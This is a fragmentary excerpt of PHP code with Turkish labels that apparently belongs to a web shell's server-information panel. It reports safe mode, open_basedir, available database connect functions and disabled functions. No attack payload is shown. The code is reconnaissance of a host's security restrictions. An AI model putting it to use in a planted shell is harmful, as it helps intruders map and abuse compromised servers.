...
else {$safemode = false; $hsafemode = "<font color=\"green\">Kapal ( GvenLik Kapal )</font>";}
echo("Mod: $hsafemode");
// PHPINFO
...
else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">Kapal ( GvenLik Kapal )</font>";}
echo("<br>");
echo("Open base dir: $hopenbasedir");
echo("<br>");
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>Ak</font></b>";}else{echo "<font color=red>Kapal</font></b>";}
echo("<br>");
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>Ak</font></b>";}else{echo "<font color=red>Kapal</font></b>";}
echo("<br>");
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>Ak</font></b>"; } else { echo "<font color=red>Kapal</font></b>"; }
echo("<br>");
...
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>Hi</font></b>";}else{echo "<font color=red>$df</font></b>";}
